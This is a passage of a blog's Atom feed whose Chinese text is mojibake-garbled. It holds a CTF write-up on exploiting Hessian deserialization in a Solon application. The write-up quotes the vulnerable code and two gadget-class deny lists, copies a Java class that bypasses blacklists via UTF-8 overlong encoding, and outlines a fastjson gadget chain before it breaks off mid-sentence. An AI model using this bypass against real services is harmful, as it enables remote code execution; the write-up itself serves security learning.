title="Weblogicç¯å¢ƒæ­å»º"></a>Weblogicç¯å¢ƒæ­å»º</h1><p>å› ä¸ºå‡†å¤‡çœ‹Weblogicï¼Œæ‰€ä»¥ç¯å¢ƒæ­å»ºä¹Ÿåœ¨è¿™é‡Œå†™äº†å§</p><p>è¿™é‡Œæ¨èè¿™ä¸ªç¯å¢ƒæ­å»ºå·¥å…·ï¼š<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘æƒ³çœ‹çœ‹weblogicï¼Œä½†æ˜¯ç¯å¢ƒæ¯”è¾ƒéš¾æ­å»ºå’Œè°ƒè¯•ï¼Œè¶ç€è¿™ä¸ªæœºä¼šï¼Œçœ‹ä¸€ä¸‹javaçš„å„ç§ä»£ç è¿œç¨‹è°ƒè¯•çš„æ–¹æ³•ï¼Œå¾ˆåŸºç¡€çš„ä¸œè¥¿äº†ï¼Œä¸€ç›´æ²¡çœ‹ã€‚(é¡ºä¾¿æ°´ä¸€ç¯‡åšå®¢)&lt;/p&gt;
&lt;h1 id=&quot;è¿œç¨‹è°ƒè¯•jaråŒ…&quot;&gt;&lt;a href=&quot;#è¿œç¨‹è°ƒè¯•JaråŒ…&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://clowsman.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>BookManagerå¤ç°</title>
    <link href="https://clowsman.github.io/2025/01/10/BookManager%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2025/01/10/BookManager%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-01-10T14:42:36.000Z</published>
    <updated>2025-01-12T13:59:03.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å½“æ—¶ciscn&amp;é•¿åŸæ¯åœºä¸Šçš„ä¸€é¢˜é›¶è§£é¢˜ï¼Œå½“æ—¶åç¼–è¯‘çœ‹äº†ä¸€ä¸‹è¿™é¢˜çš„æºç ï¼Œå‘ç°æ˜¯å¾®æœåŠ¡å½¢å¼çš„ï¼Œæœ‰ä¸ªApiGatewayï¼Œç„¶åçœ‹äº†åŠå¤©ä¹Ÿæ‰¾ä¸åˆ°ååºåˆ—åŒ–çš„ç‚¹ï¼Œç”šè‡³è¿è¯·æ±‚å“ªä¸ªè·¯ç”±éƒ½ä¸æ¸…æ¥šğŸ¥²ç„¶åç”¨çš„åˆæ˜¯solonè¿™ä¸ªæ¡†æ¶ä¸ç†Ÿæ‚‰ï¼Œç›´æ¥å¼€æ‘†äº†</p><p>åæ¥çœ‹åˆ°æœ‰å¸ˆå‚…è§£å‡ºæ¥äº†ï¼Œé‚æ¥å¤ç°ä¸€ä¸‹</p><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>çœ‹äº†ä¸€ä¸‹æ‰å‘ç°ç½‘å…³è¿™é‡Œé™åˆ¶äº†æˆ‘ä»¬çš„è·¯ç”±å‰ç¼€(æ²¡å­¦è¿‡ä¸å¤ªæ‡‚ğŸ˜­ï¼Œæ€ªä¸å¾—ç›´æ¥getAllBooksä»€ä¹ˆéƒ½æ²¡æœ‰</p><p><img src="https://cdn.clown2024.cn/image-20250112172824168.png" alt="image-20250112172824168"></p><p>ç›´æ¥é—®deepseekçš„è§£é‡Šå¦‚ä¸‹ï¼š</p><blockquote><p>è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ª API ç½‘å…³ï¼Œä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p><ol><li><strong>è·¯ç”±åŒ¹é…</strong>ï¼š<ul><li>æ‰€æœ‰ä»¥ <code>/api/rest/</code> å¼€å¤´çš„è¯·æ±‚éƒ½ä¼šè¢«è¯¥ç½‘å…³å¤„ç†ã€‚</li><li>ä¾‹å¦‚ï¼Œ<code>/api/rest/book</code> ä¼šè¢«æ˜ å°„åˆ° <code>BookServiceImpl</code> ç±»ã€‚</li></ul></li><li><strong>å‰ç½®é€»è¾‘</strong>ï¼š<ul><li>åœ¨è¯·æ±‚å¤„ç†ä¹‹å‰ï¼Œè®¾ç½®é»˜è®¤çš„å“åº”æ¸²æŸ“æ ¼å¼ä¸º JSONã€‚</li></ul></li><li><strong>æœåŠ¡æ³¨å†Œ</strong>ï¼š<ul><li>å°† <code>BookServiceImpl</code> ç±»æ³¨å†Œä¸ºå¤„ç† <code>/api/rest/book</code> è·¯å¾„çš„æœåŠ¡ã€‚</li></ul></li></ol></blockquote><p><img src="https://cdn.clown2024.cn/image-20250110225521551.png" alt="image-20250110225521551"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯solonçš„2.5.12çš„ç‰ˆæœ¬ï¼Œå½“æ—¶ç›´æ¥æœæ˜¯æ²¡æœ‰æœåˆ°è¯¥ç‰ˆæœ¬çš„æ¼æ´çš„ï¼Œä¸€æœååºåˆ—åŒ–åŸºæœ¬éƒ½æ˜¯2.5.11çš„</p><p><img src="https://cdn.clown2024.cn/image-20250110225852926.png" alt="image-20250110225852926"></p><p>ç„¶åè¿™ä½è€å“¥æ˜¯ä»githubçš„issueç¿»åˆ°ç›¸å…³çš„ä¿¡æ¯ï¼Œå˜¶æˆ‘çªç„¶æƒ³åˆ°æˆ‘å¯ä»¥ç”¨è‹±æ–‡æœä¸€æœè¯•è¯•ï¼Œè¢«ä¸­æ–‡é™åˆ¶äº†ï¼Œæ€ªä¸å¾—æˆ‘æ¯æ¬¡éƒ½æ‰¾ä¸åˆ°expğŸ˜­</p><p><img src="https://cdn.clown2024.cn/image-20250110230600436.png" alt="image-20250110230600436"></p><p>æœç„¶æ¢è‹±æ–‡å°±èƒ½æœåˆ°å¾ˆå¤šä¸œè¥¿äº†ï¼Œå¯ä»¥ç›´æ¥å»å¯¹åº”çš„issueçœ‹ä¸€çœ‹ï¼š<a href="https://github.com/opensolon/solon/issues/226%EF%BC%8C%E8%BF%99%E4%B8%AAissue%E6%98%AF%E7%94%A8Fury%E7%BB%84%E4%BB%B6%E7%9A%84RPC%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E">https://github.com/opensolon/solon/issues/226ï¼Œè¿™ä¸ªissueæ˜¯ç”¨Furyç»„ä»¶çš„RPCåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¼æ´</a></p><p><img src="https://cdn.clown2024.cn/image-20250110231433766.png" alt="image-20250110231433766"></p><p>ä½†æ˜¯é¢˜ç›®ç»™çš„è¿™ä¸ªç‰ˆæœ¬ä¸ºå•¥å‹æ ¹å°±æ²¡è¿™ä¸œè¥¿ã€‚ã€‚ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20250110231514440.png" alt="image-20250110231514440"></p><p>ç„¶åè€å“¥æ˜¯æ‰¾çš„å†å¾€å‰çš„ä¸€ä¸ªRCEçš„issueï¼š<a href="https://github.com/opensolon/solon/issues/73">https://github.com/opensolon/solon/issues/73</a></p><p>è¯¥issueçš„æ¼æ´æ˜¯ä¸€ä¸ªHessianååºåˆ—åŒ–ï¼Œåœ¨<strong>org&#x2F;noear&#x2F;solon&#x2F;serialization&#x2F;hessian&#x2F;HessianActionExecutor.java</strong>è¿™ä¸ªç±»é‡Œé¢çš„æ¼æ´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">changeBody</span><span class="hljs-params">(Context ctx)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ctx.bodyAsBytes()));<br>    <span class="hljs-keyword">return</span> hi.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250110232003916.png" alt="image-20250110232003916"></p><p>æ‰€ä»¥å¦‚æœContent-Type ä¸º <code>application/hessian</code> ï¼Œåˆ™å‘é€åˆ°å«å‚ RESTful API çš„ Request ä¸­çš„ Body éƒ¨åˆ†ä¼šè¢« Hessian è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯é¢˜ç›®è¿™é‡Œæ˜¯æ‰‹åŠ¨åŠ äº†ä¸€ä¸ªtestedæ–¹æ³•æ¥è¿‡æ»¤</p><p>é¡ºä¾¿çœ‹äº†ä¸€ä¸‹åŸä½œè€…çš„ä¿®å¤ï¼Œæ˜¯å°†å¯¹hessiançš„ä¾èµ–æ”¹æˆsofa-hessianï¼Œè¯¥ç‰ˆæœ¬ç”¨çš„ä¹Ÿæ˜¯sofa-hessianï¼Œæœ‰è¶£çš„æ˜¯åé¢åˆæœ‰issueæŠŠsofa-hessianç»™ç»•äº†ï¼š<a href="https://github.com/opensolon/solon/issues/145">https://github.com/opensolon/solon/issues/145</a></p><h2 id="wafç»•è¿‡"><a href="#wafç»•è¿‡" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡</h2><p>çœ‹ä¸€ä¸‹ä»–çš„è¿‡æ»¤æ–¹æ³•ï¼Œsofa-hessianæœ¬èº«å°±æ˜¯åˆ©ç”¨äº†é»‘åå•çš„æ–¹å¼ï¼Œé‡Œé¢åœ¨hessianååºåˆ—åŒ–çš„è¿‡ç¨‹è¿›è¡Œäº†patch</p><p>åœ¨com.alibaba.com.caucho.hessian.io&#x2F;ClassFactoryé‡Œé¢ï¼Œemmmä½†æ˜¯è¯´å®è¯è¿™é‡ŒæŒºå¥‡æ€ªçš„ï¼Œæˆ‘æœ¬åœ°ä¸‹äº†sofa-hessianä»–æ˜¯å¹¶æ²¡æœ‰è¿™ä¸ªClassFactoryçš„ï¼Œåè€Œæ˜¯åœ¨æ­£å¸¸çš„hessiané‡Œé¢çš„ï¼Œsofa-hessiançš„é»‘åå•æ˜¯å¦ä¸€ç§æ–¹å¼çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">static &#123;<br>        _staticAllowList = new ArrayList&lt;Allow&gt;();<br><br>        ClassLoader classLoader = ClassFactory.class.getClassLoader();<br>        List&lt;String&gt; stringList = new ArrayList&lt;&gt;();<br>        for (byte[] bytes : byteArray) &#123;<br>            stringList.add(new String(bytes));<br>        &#125;<br>        String[] denyClasses = stringList.toArray(new String[0]);<br>        for (String denyClass : denyClasses) &#123;<br>            if (denyClass.startsWith(&quot;#&quot;)) &#123;<br>                continue;<br>            &#125;<br>            if (denyClass.endsWith(&quot;.&quot;)) &#123;<br>                _staticAllowList.add(new AllowPrefix(denyClass, false));<br>            &#125; else &#123;<br>                _staticAllowList.add(new Allow(toPattern(denyClass), false));<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>é»‘åå•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.apache.bcel.util.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>pstore.shaded.org.apache.commons.collections.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>ç„¶åé¢˜ç›®è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªè‡ªå·±çš„é»‘åå•</p><p><img src="https://cdn.clown2024.cn/image-20250110234707451.png" alt="image-20250110234707451"></p><p>testCaseså°±ç”¨äºŒç»´æ•°ç»„å­˜æ”¾è¿‡æ»¤çš„ç±»ï¼Œè¿‡æ»¤çš„ç±»å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.codec.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.dom4j.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.junit.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.mockito.<br>org.thymeleaf.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>ognl.<br>pstore.shaded.org.apache.commons.collections.<br>sun.print.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºç›´æ¥æ£€æµ‹åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œé‚£å°±å¯ä»¥ç›´æ¥åˆ©ç”¨UTF-8 Overlong Encodingæ–¹æ³•ç»•è¿‡ï¼Œè™½ç„¶æ˜¯Hessianä½†æœ¬è´¨ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼ŒX1r0zâœŒçš„æ–‡ç« æœ‰è¯´ï¼š<a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/</a></p><p>é‡Œé¢ä¹Ÿæœ‰å†™å¥½çš„ä»£ç ï¼Œè¿™é‡Œcopyä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Hessian2Output</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Hessian2OutputWithOverlongEncoding</span><span class="hljs-params">(OutputStream os)</span> &#123;<br>        <span class="hljs-built_in">super</span>(os);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printString</span><span class="hljs-params">(String v, <span class="hljs-type">int</span> strOffset, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>        <span class="hljs-type">byte</span>[] buffer = (<span class="hljs-type">byte</span>[]) getSuperFieldValue(<span class="hljs-string">&quot;_buffer&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (SIZE &lt;= offset + <span class="hljs-number">16</span>) &#123;<br>                setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>                flushBuffer();<br>                offset = (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> v.charAt(i + strOffset);<br><br>            <span class="hljs-comment">// 2 bytes UTF-8</span><br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0xc0</span> + (convert(ch)[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x1f</span>));<br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0x80</span> + (convert(ch)[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0x3f</span>));<br><br><span class="hljs-comment">//            if (ch &lt; 0x80)</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (ch);</span><br><span class="hljs-comment">//            else if (ch &lt; 0x800) &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xc0 + ((ch &gt;&gt; 6) &amp; 0x1f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            else &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xe0 + ((ch &gt;&gt; 12) &amp; 0xf));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + ((ch &gt;&gt; 6) &amp; 0x3f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br>        &#125;<br><br>        setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printString</span><span class="hljs-params">(<span class="hljs-type">char</span>[] v, <span class="hljs-type">int</span> strOffset, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>        <span class="hljs-type">byte</span>[] buffer = (<span class="hljs-type">byte</span>[]) getSuperFieldValue(<span class="hljs-string">&quot;_buffer&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (SIZE &lt;= offset + <span class="hljs-number">16</span>) &#123;<br>                setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>                flushBuffer();<br>                offset = (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> v[i + strOffset];<br><br>            <span class="hljs-comment">// 2 bytes UTF-8</span><br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0xc0</span> + (convert(ch)[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x1f</span>));<br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0x80</span> + (convert(ch)[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0x3f</span>));<br><br><span class="hljs-comment">//            if (ch &lt; 0x80)</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (ch);</span><br><span class="hljs-comment">//            else if (ch &lt; 0x800) &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xc0 + ((ch &gt;&gt; 6) &amp; 0x1f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            else &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xe0 + ((ch &gt;&gt; 12) &amp; 0xf));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + ((ch &gt;&gt; 6) &amp; 0x3f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br>        &#125;<br><br>        setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] convert(<span class="hljs-type">int</span> i) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> ((i &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0b11111</span>) | <span class="hljs-number">0b11000000</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> (i &amp; <span class="hljs-number">0b111111</span>) | <span class="hljs-number">0b10000000</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123; b1, b2 &#125;;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getSuperFieldValue</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getSuperclass().getDeclaredField(name);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> f.get(<span class="hljs-built_in">this</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSuperFieldValue</span><span class="hljs-params">(String name, Object val)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getSuperclass().getDeclaredField(name);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            f.set(<span class="hljs-built_in">this</span>, val);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªfastjson1.2.83çš„ç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥ç”¨fastjsonåŸç”Ÿååºåˆ—åŒ–çš„é‚£æ¡é“¾å­ï¼Œä¸è¿‡å› ä¸ºæœ‰äº›ç±»è¢«banäº†æˆ‘ä»¬éœ€è¦ç»•è¿‡ï¼Œå…ˆçœ‹ä¸€ä¸‹æœ¬æ¥çš„é“¾å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream.readObject -&gt; <br>HashMap.readObject -&gt; <br>BadAttributeValueExpException.readObject -&gt; <br>JSONArray.toString -&gt; <br>JSON.toString ï¼ˆJSONArray extends JSONï¼‰-&gt; <br>JSON.toJSONString -&gt; <br>TemplatesImpl.getOutputProperties -&gt; <br>TemplatesImpl.newTransformer<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡ŒBadAttributeValueExpExceptionå’ŒTemplatesImpléƒ½è¢«è¿‡æ»¤äº†ï¼Œéœ€è¦æ‰¾å…¶ä»–ç±»æ›¿æ¢ä¸€ä¸‹ï¼ŒBadAttributeValueExpExceptionæˆ‘ä»¬å¯ä»¥æ›¿æ¢æˆ<strong>XString</strong>ï¼Œå› 